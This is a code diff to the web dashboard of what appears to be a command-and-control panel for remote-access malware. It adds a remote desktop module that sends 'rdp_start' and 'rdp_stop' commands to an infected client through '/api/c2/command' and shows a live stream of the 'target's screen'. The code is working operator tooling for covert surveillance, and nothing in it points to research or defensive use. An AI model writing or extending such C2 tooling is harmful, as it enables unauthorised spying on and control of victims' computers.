@@ -371,11 +371,38 @@
                     <h2>Remote Desktop</h2>
                     <p class="subtitle">View and control the target's screen in real-time</p>
                 </header>
-                <div class="panel-card">
-                    <div class="module-placeholder">
-                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
-                        <span>Remote Desktop — coming soon</span>
+
+                <!-- Controls -->
+                <div class="panel-card" style="margin-bottom:16px;">
+                    <div style="display:flex;align-items:center;gap:24px;flex-wrap:wrap;">
+                        <button class="btn btn-primary" id="rdp-toggle-btn">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                            Start Stream
+                        </button>
+
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <label style="font-size:12px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">FPS</label>
+                            <input type="range" class="slider-range" id="rdp-fps" min="1" max="30" value="10" style="width:120px;">
+                            <span id="rdp-fps-val" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);min-width:24px;">10</span>
+                        </div>
+
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <label style="font-size:12px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">Quality</label>
+                            <input type="range" class="slider-range" id="rdp-quality" min="10" max="100" value="50" step="5" style="width:120px;">
+                            <span id="rdp-quality-val" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);min-width:36px;">50%</span>
+                        </div>
+
+                        <span id="rdp-status" style="font-size:12px;color:var(--text-muted);margin-left:auto;">Stopped</span>
                     </div>
+                </div>
+
+                <!-- Screen view -->
+                <div class="panel-card" style="padding:0;overflow:hidden;background:rgba(0,0,0,0.4);">
+                    <div id="rdp-placeholder" style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:400px;color:var(--text-muted);gap:16px;">
+                        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" style="opacity:0.15;"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                        <span style="font-size:13px;">Press Start Stream to begin</span>
+                    </div>
+                    <img id="rdp-frame" style="display:none;width:100%;height:auto;" alt="Remote Desktop">
                 </div>
             </div>
 
@@ -649,6 +676,80 @@
                 });
                 alert('Uninstall command sent.');
             } catch { alert('Failed to send command.'); }
+        });
+
+        // Remote Desktop controls
+        const rdpToggleBtn = document.getElementById('rdp-toggle-btn');
+        const rdpFpsSlider = document.getElementById('rdp-fps');
+        const rdpFpsVal = document.getElementById('rdp-fps-val');
+        const rdpQualitySlider = document.getElementById('rdp-quality');
+        const rdpQualityVal = document.getElementById('rdp-quality-val');
+        const rdpStatus = document.getElementById('rdp-status');
+        const rdpPlaceholder = document.getElementById('rdp-placeholder');
+        const rdpFrame = document.getElementById('rdp-frame');
+        let rdpStream = null;
+        let rdpRunning = false;
+
+        rdpFpsSlider.addEventListener('input', () => {
+            rdpFpsVal.textContent = rdpFpsSlider.value;
+        });
+        rdpQualitySlider.addEventListener('input', () => {
+            rdpQualityVal.textContent = rdpQualitySlider.value + '%';
+        });
+
+        rdpToggleBtn.addEventListener('click', async () => {
+            if (!rdpRunning) {
+                const fps = rdpFpsSlider.value;
+                const quality = rdpQualitySlider.value;
+                try {
+                    await fetch('/api/c2/command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ client_id: clientId, command: 'rdp_start:' + fps + ':' + quality })
+                    });
+                    rdpRunning = true;
+                    rdpToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="6" y="6" width="12" height="12" rx="2"/></svg> Stop';
+                    rdpToggleBtn.classList.remove('btn-primary');
+                    rdpToggleBtn.classList.add('btn-danger');
+                    rdpStatus.textContent = 'Connecting...';
+                    rdpStatus.style.color = 'var(--warning, #f59e0b)';
+
+                    rdpStream = new EventSource('/api/c2/stream/' + encodeURIComponent(clientId));
+                    rdpStream.onmessage = (e) => {
+                        if (e.data) {
+                            rdpFrame.src = 'data:image/jpeg;base64,' + e.data;
+                            rdpFrame.style.display = 'block';
+                            rdpPlaceholder.style.display = 'none';
+                            rdpStatus.textContent = 'Streaming';
+                            rdpStatus.style.color = 'var(--success, #10b981)';
+                        }
+                    };
+                    rdpStream.onerror = () => {
+                        rdpStatus.textContent = 'Connection lost';
+                        rdpStatus.style.color = 'var(--danger, #ef4444)';
+                    };
+                } catch {
+                    rdpStatus.textContent = 'Failed to start';
+                    rdpStatus.style.color = 'var(--danger, #ef4444)';
+                }
+            } else {
+                try {
+                    await fetch('/api/c2/command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ client_id: clientId, command: 'rdp_stop' })
+                    });
+                } catch {}
+                if (rdpStream) { rdpStream.close(); rdpStream = null; }
+                rdpRunning = false;
+                rdpToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg> Start';
+                rdpToggleBtn.classList.remove('btn-danger');
+                rdpToggleBtn.classList.add('btn-primary');
+                rdpFrame.style.display = 'none';
+                rdpPlaceholder.style.display = 'flex';
+                rdpStatus.textContent = 'Stopped';
+                rdpStatus.style.color = 'var(--text-muted)';
+            }
         });
 
         // Auth check & init
